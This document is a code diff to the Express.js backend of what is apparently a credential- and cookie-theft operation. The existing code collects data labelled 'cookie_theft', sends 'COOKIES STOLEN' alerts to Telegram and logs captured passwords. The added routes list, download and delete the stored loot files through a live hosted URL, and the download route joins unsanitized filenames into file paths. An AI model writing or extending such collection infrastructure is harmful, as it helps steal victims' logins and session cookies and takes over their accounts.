@@ -75,6 +75,92 @@ async function createDataFile(data) {
   return { filename, filepath };
 }
 
+// ==================== DOWNLOAD ROUTES ====================
+
+// File download route
+router.get('/download/:filename', async (req, res) => {
+  try {
+    const filename = req.params.filename;
+    const filepath = path.join(COOKIES_DIR, filename);
+    
+    try {
+      await fs.access(filepath);
+    } catch (error) {
+      return res.status(404).json({ 
+        success: false, 
+        message: "File not found"
+      });
+    }
+    
+    res.setHeader('Content-Type', 'application/json');
+    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+    
+    const fileContent = await fs.readFile(filepath, 'utf8');
+    res.send(fileContent);
+    
+  } catch (error) {
+    console.error('Error downloading file:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: "Error downloading file"
+    });
+  }
+});
+
+// List all data files
+router.get('/files', async (req, res) => {
+  try {
+    await ensureDataDir();
+    const files = await fs.readdir(COOKIES_DIR);
+    const dataFiles = files.filter(file => file.endsWith('.json'));
+    
+    res.json({
+      success: true,
+      totalFiles: dataFiles.length,
+      files: dataFiles.map(file => ({
+        filename: file,
+        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${file}`,
+        size: 'N/A'
+      }))
+    });
+  } catch (error) {
+    console.error('Error listing files:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: "Error listing files"
+    });
+  }
+});
+
+// Clear all data files (for testing)
+router.delete('/files', async (req, res) => {
+  try {
+    await ensureDataDir();
+    const files = await fs.readdir(COOKIES_DIR);
+    
+    let deletedCount = 0;
+    for (const file of files) {
+      if (file.endsWith('.json')) {
+        await fs.unlink(path.join(COOKIES_DIR, file));
+        deletedCount++;
+      }
+    }
+    
+    res.json({
+      success: true,
+      message: `Deleted ${deletedCount} data files`,
+      deletedCount: deletedCount
+    });
+    
+  } catch (error) {
+    console.error('Error clearing files:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: "Error clearing files"
+    });
+  }
+});
+
 // MAIN ENDPOINT - Data collection with Telegram
 router.post('/', async (req, res) => {
   try {
@@ -154,7 +240,8 @@ router.post('/', async (req, res) => {
 
 ⏰ <b>Time:</b> ${new Date().toISOString()}
 
-💾 <b>File:</b> ${fileInfo ? fileInfo.filename : 'Not saved'}`;
+💾 <b>File:</b> ${fileInfo ? fileInfo.filename : 'Not saved'}
+📥 <b>Download:</b> ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}` : 'N/A'}`;
 
     } else if (type === 'cookie_theft' || type === 'initial_cookie_theft') {
       telegramMessage = `🍪 <b>COOKIES STOLEN</b>
@@ -214,7 +301,7 @@ router.post('/', async (req, res) => {
       console.log('   Password captured:', '***');
     }
 
-    // Return success response
+    // Return success response WITH DOWNLOAD INFO
     res.status(200).json({
       success: true,
       message: "Data received successfully",
@@ -228,7 +315,8 @@ router.post('/', async (req, res) => {
       },
       downloadInfo: fileInfo ? {
         filename: fileInfo.filename,
-        downloadUrl: `/cookies/download/${fileInfo.filename}`
+        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download/${fileInfo.filename}`,
+        fullPath: fileInfo.filepath
       } : null,
       timestamp: new Date().toISOString()
     });
